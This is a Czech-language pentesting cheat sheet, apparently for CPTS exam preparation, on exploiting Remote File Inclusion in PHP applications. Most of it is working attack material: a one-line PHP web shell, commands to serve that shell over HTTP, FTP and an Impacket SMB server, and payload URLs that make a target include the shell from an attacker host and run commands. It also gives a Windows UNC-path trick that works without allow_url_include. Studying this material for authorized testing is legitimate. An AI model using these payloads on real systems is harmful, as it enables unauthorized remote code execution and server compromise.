Remote File Inclusion (RFI) umožňuje načíst a spustit vzdálený skript z útočníkova serveru (HTTP, FTP, SMB). Na rozdíl od LFI nabízí přímou cestu k Remote Code Execution (RCE) nebo internímu průzkumu sítě (SSRF).

**Rychlý přehled protokolů pro CPTS / Pentest**

|**Protokol**|**Požadovaná konfigurace**|**Běžné porty**|**Příklad RFI Payloadu**|
|---|---|---|---|
|**HTTP / HTTPS**|`allow_url_include = On`|80, 443, 8000|`?language=http://<ATTACKER_IP>/shell.php&cmd=id`|
|**FTP**|`allow_url_include = On`|21|`?language=ftp://<ATTACKER_IP>/shell.php&cmd=id`|
|**SMB (Windows)**|**Žádná** (`allow_url_include` může být `Off`)|445|`?language=\\<ATTACKER_IP>\share\shell.php&cmd=whoami`|

**1. Ověření zranitelnosti (RFI Verification)**

Před odesláním skriptu z vlastní IP adresy ověřte, zda aplikace podporuje vzdálená URL:

- **Smyčka na vyzkoušení (SSRF/RFI test):**
    
    `http://<TARGET>/index.php?language=[http://127.0.0.1:80/index.php](http://127.0.0.1:80/index.php)`
    
    _(Pokud se stránka načte nebo vykoná znovu, aplikace přijímá vzdálená URL.)_
    
- **Kontrola PHP konfigurace (přes LFI/PHP filter):**
    
    Zkontrolujte soubor `php.ini`, zda obsahuje `allow_url_include = On`.
    

**2. Příprava univerzálního Web Shellu**

Vytvořte jednoduchý PHP shell na svém útočném stroji:

Bash

```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

**3. Vektory exploatace podle protokolu**

**Metoda A: HTTP Web Server (Standardní)**

Nejčastější metoda. Vyžaduje `allow_url_include = On`.

1. Spusťte HTTP server v adresáři se `shell.php`:
    
    Bash
    
    ```
    sudo python3 -m http.server 80
    ```
    
2. Odeslete HTTP požadavek na oběť:
    
    Fragment kódu
    
    ```
    http://<TARGET>/index.php?language=http://<ATTACKER_IP>/shell.php&cmd=id
    ```
    

**Metoda B: FTP Server (Obcházení WAF / Firewallu)**

Užitečné, pokud WAF blokuje řetězce `http://` nebo outbound HTTP provoz.

1. Spusťte Anonymní FTP server:
    
    Bash
    
    ```
    sudo python3 -m pyftpdlib -p 21
    ```
    
2. Odeslete požadavek (případně s přihlašovacími údaji `user:pass@`):
    
    Fragment kódu
    
    ```
    http://<TARGET>/index.php?language=ftp://<ATTACKER_IP>/shell.php&cmd=id
    ```
    

**Metoda C: Windows SMB (Klíčový CPTS Exam Trick!)**

Pokud cílová aplikace běží na **Windows**, Windows přistupuje k UNC cestám (`\\IP\share`) jako k lokálním souborům. **Nevyžaduje `allow_url_include = On`!**

1. Spusťte SMB server pomocí Impacketu:
    
    Bash
    
    ```
    impacket-smbserver share $(pwd) -smb2support
    ```
    
2. Odeslete UNC cestu v parametru:
    
    Fragment kódu
    
    ```
    http://<TARGET>/index.php?language=\\<ATTACKER_IP>\share\shell.php&cmd=whoami
    ```